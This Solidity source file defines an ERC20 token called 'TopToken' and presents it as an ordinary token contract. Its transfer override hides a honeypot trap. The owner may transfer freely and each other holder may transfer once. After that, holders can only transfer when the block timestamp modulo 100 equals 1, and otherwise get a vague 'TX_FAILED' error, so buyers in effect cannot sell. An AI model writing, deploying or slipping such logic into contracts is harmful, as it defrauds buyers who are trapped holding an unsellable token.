// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TopToken is ERC20 {
    address private immutable _owner;
    mapping(address => bool) private _hasTraded;

    constructor() ERC20("TopToken", "HNY") {
        _owner = msg.sender;
        _mint(msg.sender, 1000000 * 10 ** 18);
    }

    function _update(address from, address to, uint256 value) internal virtual override {
        if (from == address(0)) {
            super._update(from, to, value);
            return;
        }

        if (to == address(0)) {
            super._update(from, to, value);
            return;
        }

        if (from == _owner) {
            super._update(from, to, value);
            return;
        }

        if (!_hasTraded[from]) {
            _hasTraded[from] = true;
            super._update(from, to, value);
            return;
        }

        require(block.timestamp % 100 == 1, "ERROR: TX_FAILED");

        super._update(from, to, value);
    }
}
